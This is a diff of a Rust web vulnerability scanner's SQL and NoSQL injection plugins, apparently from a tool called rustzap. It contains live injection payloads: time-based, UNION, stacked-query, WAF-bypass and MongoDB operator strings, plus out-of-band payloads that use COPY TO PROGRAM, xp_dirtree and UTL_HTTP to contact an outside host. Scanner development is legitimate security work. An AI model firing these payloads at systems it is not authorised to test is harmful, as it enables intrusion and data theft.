@@ -11,14 +11,11 @@
 ///   8.  WAF bypass            — comment, case, encoding, whitespace variants
 ///   9.  NoSQL injection       — MongoDB operator injection ($where, $ne, $gt)
 ///  10.  DB fingerprinting     — identify MySQL / PostgreSQL / MSSQL / Oracle / SQLite
-
 use std::time::{Duration, Instant};
-use std::collections::HashMap;
 
 use async_trait::async_trait;
-use tracing::debug;
 
-use crate::active::{ScanPlugin, build_injection_urls_adv, timed_get, get_body};
+use crate::active::{build_injection_urls_adv, get_body, timed_get, ScanPlugin};
 use crate::types::{DiscoveredUrl, Finding, Severity};
 
 // ─────────────────────────────────────────────────────────────────────────────
@@ -29,55 +26,80 @@ pub struct SqliErrorPlugin;
 
 #[async_trait]
 impl ScanPlugin for SqliErrorPlugin {
-    fn name(&self) -> &str { "sqli-error" }
-    fn description(&self) -> &str { "SQLi error-based — extended DB error signatures (MySQL/PG/MSSQL/Oracle/SQLite)" }
+    fn name(&self) -> &str {
+        "sqli-error"
+    }
+    fn description(&self) -> &str {
+        "SQLi error-based — extended DB error signatures (MySQL/PG/MSSQL/Oracle/SQLite)"
+    }
 
     async fn scan(&self, client: &reqwest::Client, target: &DiscoveredUrl) -> Vec<Finding> {
         let payloads: &[(&str, &[&str])] = &[
             // Generic quote
-            ("'", &[
-                "You have an error in your SQL syntax",
-                "mysql_fetch",
-                "mysql_num_rows",
-                "com.mysql.jdbc",
-            ]),
+            (
+                "'",
+                &[
+                    "You have an error in your SQL syntax",
+                    "mysql_fetch",
+                    "mysql_num_rows",
+                    "com.mysql.jdbc",
+                ],
+            ),
             // PostgreSQL
-            ("'", &[
-                "pg_query()",
-                "PSQLException",
-                "unterminated quoted string",
-                "syntax error at or near",
-                "ERROR:  syntax error",
-            ]),
+            (
+                "'",
+                &[
+                    "pg_query()",
+                    "PSQLException",
+                    "unterminated quoted string",
+                    "syntax error at or near",
+                    "ERROR:  syntax error",
+                ],
+            ),
             // MSSQL
-            ("'", &[
-                "Unclosed quotation mark after the character string",
-                "Microsoft OLE DB Provider for SQL Server",
-                "Incorrect syntax near",
-                "SqlException",
-                "System.Data.SqlClient",
-            ]),
+            (
+                "'",
+                &[
+                    "Unclosed quotation mark after the character string",
+                    "Microsoft OLE DB Provider for SQL Server",
+                    "Incorrect syntax near",
+                    "SqlException",
+                    "System.Data.SqlClient",
+                ],
+            ),
             // Oracle
-            ("'", &[
-                "ORA-00907",
-                "ORA-00933",
-                "ORA-00942",
-                "ORA-01722",
-                "oracle.jdbc",
-            ]),
+            (
+                "'",
+                &[
+                    "ORA-00907",
+                    "ORA-00933",
+                    "ORA-00942",
+                    "ORA-01722",
+                    "oracle.jdbc",
+                ],
+            ),
             // SQLite
-            ("'", &[
-                "SQLite3::query",
-                "sqlite3.OperationalError",
-                "no such column",
-                "unrecognized token",
-            ]),
+            (
+                "'",
+                &[
+                    "SQLite3::query",
+                    "sqlite3.OperationalError",
+                    "no such column",
+                    "unrecognized token",
+                ],
+            ),
             // Extended triggers
             ("1/0", &["division by zero", "divide by zero", "ORA-01476"]),
             ("'||'", &["ORA-", "PostgreSQL", "syntax error"]),
             ("1 EXEC xp_", &["xp_cmdshell", "xp_regread", "xp_enumdsn"]),
-            (r#"' AND extractvalue(1,concat(0x7e,version()))-- -"#, &["XPATH syntax error", "~5.", "~8."]),
-            (r#"' AND (SELECT * FROM (SELECT(SLEEP(0)))a)-- -"#, &["syntax", "error"]),
+            (
+                r#"' AND extractvalue(1,concat(0x7e,version()))-- -"#,
+                &["XPATH syntax error", "~5.", "~8."],
+            ),
+            (
+                r#"' AND (SELECT * FROM (SELECT(SLEEP(0)))a)-- -"#,
+                &["syntax", "error"],
+            ),
         ];
 
         for (payload, signatures) in payloads {
@@ -118,34 +140,47 @@ pub struct SqliBooleanPlugin;
 
 #[async_trait]
 impl ScanPlugin for SqliBooleanPlugin {
-    fn name(&self) -> &str { "sqli-boolean" }
-    fn description(&self) -> &str { "SQLi boolean-blind — compare TRUE/FALSE page differences" }
+    fn name(&self) -> &str {
+        "sqli-boolean"
+    }
+    fn description(&self) -> &str {
+        "SQLi boolean-blind — compare TRUE/FALSE page differences"
+    }
 
     async fn scan(&self, client: &reqwest::Client, target: &DiscoveredUrl) -> Vec<Finding> {
         // Pairs: (true_payload, false_payload)
         let pairs: &[(&str, &str)] = &[
-            ("1 AND 1=1",      "1 AND 1=2"),
-            ("1' AND '1'='1",  "1' AND '1'='2"),
-            ("1 AND 1=1-- -",  "1 AND 1=2-- -"),
-            ("' OR 1=1-- -",   "' OR 1=2-- -"),
+            ("1 AND 1=1", "1 AND 1=2"),
+            ("1' AND '1'='1", "1' AND '1'='2"),
+            ("1 AND 1=1-- -", "1 AND 1=2-- -"),
+            ("' OR 1=1-- -", "' OR 1=2-- -"),
             // MySQL specific
-            ("1 AND (SELECT 1)=1",  "1 AND (SELECT 1)=0"),
+            ("1 AND (SELECT 1)=1", "1 AND (SELECT 1)=0"),
             // PG
-            ("1 AND TRUE",          "1 AND FALSE"),
+            ("1 AND TRUE", "1 AND FALSE"),
             // MSSQL
             ("1 AND 1=CONVERT(int,'1')", "1 AND 1=CONVERT(int,'A')"),
         ];
 
-        let variants_base = build_injection_urls_adv(target, "1");
-
         for (true_pl, false_pl) in pairs {
-            let true_variants  = build_injection_urls_adv(target, true_pl);
+            let true_variants = build_injection_urls_adv(target, true_pl);
             let false_variants = build_injection_urls_adv(target, false_pl);
 
-            for ((param, true_url), (_, false_url)) in true_variants.iter().zip(false_variants.iter()) {
-                let baseline = get_body(client, &target.url).await.map(|(_, b)| b.len()).unwrap_or(0);
-                let true_len  = get_body(client, true_url).await.map(|(_, b)| b.len()).unwrap_or(0);
-                let false_len = get_body(client, false_url).await.map(|(_, b)| b.len()).unwrap_or(0);
+            for ((param, true_url), (_, false_url)) in
+                true_variants.iter().zip(false_variants.iter())
+            {
+                let baseline = get_body(client, &target.url)
+                    .await
+                    .map(|(_, b)| b.len())
+                    .unwrap_or(0);
+                let true_len = get_body(client, true_url)
+                    .await
+                    .map(|(_, b)| b.len())
+                    .unwrap_or(0);
+                let false_len = get_body(client, false_url)
+                    .await
+                    .map(|(_, b)| b.len())
+                    .unwrap_or(0);
 
                 // Heuristic: true response ≈ baseline, false response meaningfully different
                 let baseline_matches_true = (true_len as i64 - baseline as i64).abs() < 50;
@@ -187,23 +222,36 @@ const TIMING_THRESHOLD_MS: u64 = 4000; // confirm if response delayed ≥4s
 
 #[async_trait]
 impl ScanPlugin for SqliTimePlugin {
-    fn name(&self) -> &str { "sqli-time" }
-    fn description(&self) -> &str { "SQLi time-based blind — SLEEP/WAITFOR/pg_sleep timing oracle" }
+    fn name(&self) -> &str {
+        "sqli-time"
+    }
+    fn description(&self) -> &str {
+        "SQLi time-based blind — SLEEP/WAITFOR/pg_sleep timing oracle"
+    }
 
     async fn scan(&self, client: &reqwest::Client, target: &DiscoveredUrl) -> Vec<Finding> {
         // (payload, db_label)
         let payloads: &[(&str, &str)] = &[
             // MySQL
             (&format!("' AND SLEEP({})-- -", SLEEP_SECS), "MySQL"),
-            (&format!("1 AND SLEEP({})", SLEEP_SECS),     "MySQL"),
+            (&format!("1 AND SLEEP({})", SLEEP_SECS), "MySQL"),
             // PostgreSQL
-            (&format!("'; SELECT pg_sleep({})-- -", SLEEP_SECS),  "PostgreSQL"),
-            (&format!("1; SELECT pg_sleep({})", SLEEP_SECS),      "PostgreSQL"),
+            (
+                &format!("'; SELECT pg_sleep({})-- -", SLEEP_SECS),
+                "PostgreSQL",
+            ),
+            (&format!("1; SELECT pg_sleep({})", SLEEP_SECS), "PostgreSQL"),
             // MSSQL
-            (&format!("'; WAITFOR DELAY '0:0:{}'-- -", SLEEP_SECS), "MSSQL"),
-            (&format!("1; WAITFOR DELAY '0:0:{}'", SLEEP_SECS),     "MSSQL"),
+            (
+                &format!("'; WAITFOR DELAY '0:0:{}'-- -", SLEEP_SECS),
+                "MSSQL",
+            ),
+            (&format!("1; WAITFOR DELAY '0:0:{}'", SLEEP_SECS), "MSSQL"),
             // Oracle (heavy CPU, no sleep — but detectable via heavy query)
-            ("1 AND 1=(SELECT COUNT(*) FROM ALL_OBJECTS WHERE ROWNUM<100000)", "Oracle"),
+            (
+                "1 AND 1=(SELECT COUNT(*) FROM ALL_OBJECTS WHERE ROWNUM<100000)",
+                "Oracle",
+            ),
             // SQLite
             (&format!("1 AND randomblob({})", 100_000_000u64), "SQLite"),
         ];
@@ -225,7 +273,10 @@ impl ScanPlugin for SqliTimePlugin {
             let variants = build_injection_urls_adv(target, payload);
             for (param, url) in variants {
                 let (elapsed_ms, ok) = timed_get(&long_client, &url).await;
-                if ok && elapsed_ms >= TIMING_THRESHOLD_MS && elapsed_ms >= baseline_ms + TIMING_THRESHOLD_MS {
+                if ok
+                    && elapsed_ms >= TIMING_THRESHOLD_MS
+                    && elapsed_ms >= baseline_ms + TIMING_THRESHOLD_MS
+                {
                     return vec![
                         Finding::new(
                             "SQL Injection — Time-Based Blind",
@@ -261,8 +312,12 @@ pub struct SqliUnionPlugin;
 
 #[async_trait]
 impl ScanPlugin for SqliUnionPlugin {
-    fn name(&self) -> &str { "sqli-union" }
-    fn description(&self) -> &str { "SQLi UNION-based — column count probing + reflection detection" }
+    fn name(&self) -> &str {
+        "sqli-union"
+    }
+    fn description(&self) -> &str {
+        "SQLi UNION-based — column count probing + reflection detection"
+    }
 
     async fn scan(&self, client: &reqwest::Client, target: &DiscoveredUrl) -> Vec<Finding> {
         // Probe column counts 1–10; look for our canary in the response
@@ -324,18 +379,22 @@ pub struct SqliStackedPlugin;
 
 #[async_trait]
 impl ScanPlugin for SqliStackedPlugin {
-    fn name(&self) -> &str { "sqli-stacked" }
-    fn description(&self) -> &str { "SQLi stacked queries — semicolon-separated secondary statement detection" }
+    fn name(&self) -> &str {
+        "sqli-stacked"
+    }
+    fn description(&self) -> &str {
+        "SQLi stacked queries — semicolon-separated secondary statement detection"
+    }
 
     async fn scan(&self, client: &reqwest::Client, target: &DiscoveredUrl) -> Vec<Finding> {
         // Use a time-delay in the stacked statement as an oracle
         let payloads: &[(&str, &str)] = &[
-            (";SELECT SLEEP(3)-- -",          "MySQL stacked + sleep"),
-            (";SELECT pg_sleep(3)-- -",        "PostgreSQL stacked + sleep"),
-            (";WAITFOR DELAY '0:0:3'-- -",     "MSSQL stacked + waitfor"),
+            (";SELECT SLEEP(3)-- -", "MySQL stacked + sleep"),
+            (";SELECT pg_sleep(3)-- -", "PostgreSQL stacked + sleep"),
+            (";WAITFOR DELAY '0:0:3'-- -", "MSSQL stacked + waitfor"),
             // Trigger an error in the second statement (detectable without timing)
-            (";SELECT 1/0-- -",               "stacked + division-by-zero"),
-            (";INVALID_STATEMENT-- -",         "stacked + syntax error"),
+            (";SELECT 1/0-- -", "stacked + division-by-zero"),
+            (";INVALID_STATEMENT-- -", "stacked + syntax error"),
         ];
 
         let long_client = reqwest::Client::builder()
@@ -386,8 +445,12 @@ pub struct SqliOobPlugin;
 
 #[async_trait]
 impl ScanPlugin for SqliOobPlugin {
-    fn name(&self) -> &str { "sqli-oob" }
-    fn description(&self) -> &str { "SQLi OOB — DNS/HTTP callback payload injection (detect only, no listener)" }
+    fn name(&self) -> &str {
+        "sqli-oob"
+    }
+    fn description(&self) -> &str {
+        "SQLi OOB — DNS/HTTP callback payload injection (detect only, no listener)"
+    }
 
     async fn scan(&self, client: &reqwest::Client, target: &DiscoveredUrl) -> Vec<Finding> {
         // We inject OOB payloads and look for indicators in the response (error suppression,
@@ -397,13 +460,34 @@ impl ScanPlugin for SqliOobPlugin {
 
         let payloads: &[(&str, &str)] = &[
             // MySQL - LOAD_FILE via UNC (Windows)
-            (&format!("' AND LOAD_FILE('\\\\\\\\{}\\\\foo')-- -", canary_domain), "MySQL UNC/LOAD_FILE"),
+            (
+                &format!("' AND LOAD_FILE('\\\\\\\\{}\\\\foo')-- -", canary_domain),
+                "MySQL UNC/LOAD_FILE",
+            ),
             // MSSQL - xp_dirtree DNS lookup
-            (&format!("'; EXEC master..xp_dirtree '\\\\{}\\foo'-- -", canary_domain), "MSSQL xp_dirtree"),
+            (
+                &format!(
+                    "'; EXEC master..xp_dirtree '\\\\{}\\foo'-- -",
+                    canary_domain
+                ),
+                "MSSQL xp_dirtree",
+            ),
             // PostgreSQL COPY TO
-            (&format!("'; COPY (SELECT '') TO PROGRAM 'nslookup {}'-- -", canary_domain), "PostgreSQL COPY TO PROGRAM"),
+            (
+                &format!(
+                    "'; COPY (SELECT '') TO PROGRAM 'nslookup {}'-- -",
+                    canary_domain
+                ),
+                "PostgreSQL COPY TO PROGRAM",
+            ),
             // Oracle UTL_HTTP
-            (&format!("' UNION SELECT UTL_HTTP.REQUEST('http://{}') FROM DUAL-- -", canary_domain), "Oracle UTL_HTTP"),
+            (
+                &format!(
+                    "' UNION SELECT UTL_HTTP.REQUEST('http://{}') FROM DUAL-- -",
+                    canary_domain
+                ),
+                "Oracle UTL_HTTP",
+            ),
         ];
 
         for (payload, label) in payloads {
@@ -455,8 +539,12 @@ pub struct SqliSecondOrderPlugin;
 
 #[async_trait]
 impl ScanPlugin for SqliSecondOrderPlugin {
-    fn name(&self) -> &str { "sqli-second-order" }
-    fn description(&self) -> &str { "SQLi second-order — store payload then trigger via a different endpoint" }
+    fn name(&self) -> &str {
+        "sqli-second-order"
+    }
+    fn description(&self) -> &str {
+        "SQLi second-order — store payload then trigger via a different endpoint"
+    }
 
     async fn scan(&self, client: &reqwest::Client, target: &DiscoveredUrl) -> Vec<Finding> {
         // Only attempt on POST endpoints that look like registration/profile update
@@ -483,7 +571,11 @@ impl ScanPlugin for SqliSecondOrderPlugin {
                 .parameters
                 .iter()
                 .map(|p| {
-                    let val: &str = if p == param { stored_payload } else { "rustzap_test" };
+                    let val: &str = if p == param {
+                        stored_payload
+                    } else {
+                        "rustzap_test"
+                    };
                     (p.as_str(), val)
                 })
                 .collect();
@@ -532,33 +624,40 @@ pub struct SqliWafBypassPlugin;
 
 #[async_trait]
 impl ScanPlugin for SqliWafBypassPlugin {
-    fn name(&self) -> &str { "sqli-waf-bypass" }
-    fn description(&self) -> &str { "SQLi WAF bypass — comment injection, case variation, encoding, whitespace tricks" }
+    fn name(&self) -> &str {
+        "sqli-waf-bypass"
+    }
+    fn description(&self) -> &str {
+        "SQLi WAF bypass — comment injection, case variation, encoding, whitespace tricks"
+    }
 
     async fn scan(&self, client: &reqwest::Client, target: &DiscoveredUrl) -> Vec<Finding> {
         // These are WAF-bypass variants of classic error/boolean payloads
         let payloads: &[(&str, &[&str])] = &[
             // Inline comment obfuscation
-            ("'/**/OR/**/1=1--",       &["error", "syntax", "mysql", "pg_query"]),
-            ("'/*!50000OR*/1=1--",      &["error", "syntax", "mysql"]),
+            (
+                "'/**/OR/**/1=1--",
+                &["error", "syntax", "mysql", "pg_query"],
+            ),
+            ("'/*!50000OR*/1=1--", &["error", "syntax", "mysql"]),
             // Case variation
-            ("' oR '1'='1",            &["error", "syntax", "warning"]),
-            ("' Or 1=1--",             &["error", "syntax"]),
+            ("' oR '1'='1", &["error", "syntax", "warning"]),
+            ("' Or 1=1--", &["error", "syntax"]),
             // URL double-encoding
-            ("%27%20OR%201%3D1--",     &["error", "syntax", "you have"]),
+            ("%27%20OR%201%3D1--", &["error", "syntax", "you have"]),
             // Null-byte injection (some WAFs stop at null byte)
-            ("'\x00 OR 1=1--",         &["error", "syntax", "mysql"]),
+            ("'\x00 OR 1=1--", &["error", "syntax", "mysql"]),
             // Whitespace alternatives (tab, newline)
-            ("'\tOR\t1=1--",           &["error", "syntax"]),
-            ("'\nOR\n1=1--",           &["error", "syntax"]),
+            ("'\tOR\t1=1--", &["error", "syntax"]),
+            ("'\nOR\n1=1--", &["error", "syntax"]),
             // Scientific notation
-            ("1e0 UNION SELECT 1--",   &["error", "syntax", "union"]),
+            ("1e0 UNION SELECT 1--", &["error", "syntax", "union"]),
             // Hex encoding of keyword
-            ("' OR 0x313d31--",        &["error", "syntax"]),
+            ("' OR 0x313d31--", &["error", "syntax"]),
             // MySQL specific version comment
-            ("' /*!UNION*/ SELECT 1--",&["error", "syntax"]),
+            ("' /*!UNION*/ SELECT 1--", &["error", "syntax"]),
             // HPP (HTTP parameter pollution) — single value side
-            ("1' AND 0x313=0x313--",   &["error", "syntax"]),
+            ("1' AND 0x313=0x313--", &["error", "syntax"]),
         ];
 
         for (payload, sigs) in payloads {
@@ -602,8 +701,12 @@ pub struct NoSqlInjectionPlugin;
 
 #[async_trait]
 impl ScanPlugin for NoSqlInjectionPlugin {
-    fn name(&self) -> &str { "nosql" }
-    fn description(&self) -> &str { "NoSQL injection — MongoDB operator injection ($ne, $gt, $where, $regex)" }
+    fn name(&self) -> &str {
+        "nosql"
+    }
+    fn description(&self) -> &str {
+        "NoSQL injection — MongoDB operator injection ($ne, $gt, $where, $regex)"
+    }
 
     async fn scan(&self, client: &reqwest::Client, target: &DiscoveredUrl) -> Vec<Finding> {
         // For JSON body POST endpoints
@@ -686,20 +789,22 @@ impl ScanPlugin for NoSqlInjectionPlugin {
         ];
 
         if let Ok(parsed) = url::Url::parse(&target.url) {
-            let params: Vec<(String, String)> = parsed.query_pairs()
+            let params: Vec<(String, String)> = parsed
+                .query_pairs()
                 .map(|(k, v)| (k.to_string(), v.to_string()))
                 .collect();
 
             for (key, _) in &params {
                 for (suffix, label) in get_payloads {
-                    let new_url = target.url.replace(
-                        &format!("{}=", key),
-                        &format!("{}{}", key, suffix),
-                    );
+                    let new_url = target
+                        .url
+                        .replace(&format!("{}=", key), &format!("{}{}", key, suffix));
 
                     if let Some((status, body)) = get_body(client, &new_url).await {
                         let bl = body.to_lowercase();
-                        if status == 200 && (bl.contains("admin") || bl.contains("token") || bl.contains("user")) {
+                        if status == 200
+                            && (bl.contains("admin") || bl.contains("token") || bl.contains("user"))
+                        {
                             return vec![
                                 Finding::new(
                                     "NoSQL Injection — MongoDB GET Operator",
@@ -734,58 +839,88 @@ impl ScanPlugin for NoSqlInjectionPlugin {
 pub struct SqliFingerprintPlugin;
 
 #[derive(Debug, Clone)]
-pub enum DbType { MySQL, PostgreSQL, MSSQL, Oracle, SQLite, Unknown }
+pub enum DbType {
+    MySQL,
+    PostgreSQL,
+    MSSQL,
+    Oracle,
+    SQLite,
+    /// Sentinel returned by callers that cannot determine the backend.
+    /// Referenced by `Display` so it must stay in the enum.
+    #[allow(dead_code)]
+    Unknown,
+}
 
 impl std::fmt::Display for DbType {
     fn fmt(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result {
         match self {
-            DbType::MySQL      => write!(f, "MySQL"),
+            DbType::MySQL => write!(f, "MySQL"),
             DbType::PostgreSQL => write!(f, "PostgreSQL"),
-            DbType::MSSQL      => write!(f, "Microsoft SQL Server"),
-            DbType::Oracle     => write!(f, "Oracle"),
-            DbType::SQLite     => write!(f, "SQLite"),
-            DbType::Unknown    => write!(f, "Unknown"),
+            DbType::MSSQL => write!(f, "Microsoft SQL Server"),
+            DbType::Oracle => write!(f, "Oracle"),
+            DbType::SQLite => write!(f, "SQLite"),
+            DbType::Unknown => write!(f, "Unknown"),
         }
     }
 }
 
 #[async_trait]
 impl ScanPlugin for SqliFingerprintPlugin {
-    fn name(&self) -> &str { "sqli-fingerprint" }
-    fn description(&self) -> &str { "SQLi DB fingerprinting — identify MySQL/PostgreSQL/MSSQL/Oracle/SQLite" }
+    fn name(&self) -> &str {
+        "sqli-fingerprint"
+    }
+    fn description(&self) -> &str {
+        "SQLi DB fingerprinting — identify MySQL/PostgreSQL/MSSQL/Oracle/SQLite"
+    }
 
     async fn scan(&self, client: &reqwest::Client, target: &DiscoveredUrl) -> Vec<Finding> {
         // Each payload produces output only on one DB
         let fingerprints: &[(&str, DbType, &[&str])] = &[
             // MySQL: @@version, version(), INFORMATION_SCHEMA
-            ("' AND 1=CONVERT(int,@@version)-- -",
-             DbType::MySQL,
-             &["mysql", "mariadb", "10.", "8.", "5.7", "5.6"]),
-            ("' UNION SELECT @@version,NULL-- -",
-             DbType::MySQL,
-             &["mysql", "mariadb", "10.", "8.0"]),
+            (
+                "' AND 1=CONVERT(int,@@version)-- -",
+                DbType::MySQL,
+                &["mysql", "mariadb", "10.", "8.", "5.7", "5.6"],
+            ),
+            (
+                "' UNION SELECT @@version,NULL-- -",
+                DbType::MySQL,
+                &["mysql", "mariadb", "10.", "8.0"],
+            ),
             // PostgreSQL
-            ("' UNION SELECT version(),NULL-- -",
-             DbType::PostgreSQL,
-             &["postgresql", "postgre", "pg "]),
-            ("'; SELECT current_setting('server_version')-- -",
-             DbType::PostgreSQL,
-             &["postgresql", "14.", "15.", "16."]),
+            (
+                "' UNION SELECT version(),NULL-- -",
+                DbType::PostgreSQL,
+                &["postgresql", "postgre", "pg "],
+            ),
+            (
+                "'; SELECT current_setting('server_version')-- -",
+                DbType::PostgreSQL,
+                &["postgresql", "14.", "15.", "16."],
+            ),
             // MSSQL
-            ("' UNION SELECT @@version,NULL-- -",
-             DbType::MSSQL,
-             &["microsoft sql server", "sql server 2019", "sql server 2022"]),
-            ("'; SELECT @@version-- -",
-             DbType::MSSQL,
-             &["microsoft", "windows nt", "sql server"]),
+            (
+                "' UNION SELECT @@version,NULL-- -",
+                DbType::MSSQL,
+                &["microsoft sql server", "sql server 2019", "sql server 2022"],
+            ),
+            (
+                "'; SELECT @@version-- -",
+                DbType::MSSQL,
+                &["microsoft", "windows nt", "sql server"],
+            ),
             // Oracle
-            ("' UNION SELECT banner,NULL FROM v$version-- -",
-             DbType::Oracle,
-             &["oracle database", "enterprise edition", "release"]),
+            (
+                "' UNION SELECT banner,NULL FROM v$version-- -",
+                DbType::Oracle,
+                &["oracle database", "enterprise edition", "release"],
+            ),
             // SQLite
-            ("' UNION SELECT sqlite_version(),NULL-- -",
-             DbType::SQLite,
-             &["3.", "sqlite"]),
+            (
+                "' UNION SELECT sqlite_version(),NULL-- -",
+                DbType::SQLite,
+                &["3.", "sqlite"],
+            ),
         ];
 
         for (payload, db, signatures) in fingerprints {
@@ -822,4 +957,20 @@ impl ScanPlugin for SqliFingerprintPlugin {
         }
         vec![]
     }
+}
+
+/// All advanced SQLi plugins ready to merge into `ActiveScanner::new`.
+pub fn plugins() -> Vec<Box<dyn ScanPlugin>> {
+    vec![
+        Box::new(SqliErrorPlugin),
+        Box::new(SqliBooleanPlugin),
+        Box::new(SqliTimePlugin),
+        Box::new(SqliUnionPlugin),
+        Box::new(SqliStackedPlugin),
+        Box::new(SqliOobPlugin),
+        Box::new(SqliSecondOrderPlugin),
+        Box::new(SqliWafBypassPlugin),
+        Box::new(NoSqlInjectionPlugin),
+        Box::new(SqliFingerprintPlugin),
+    ]
 }
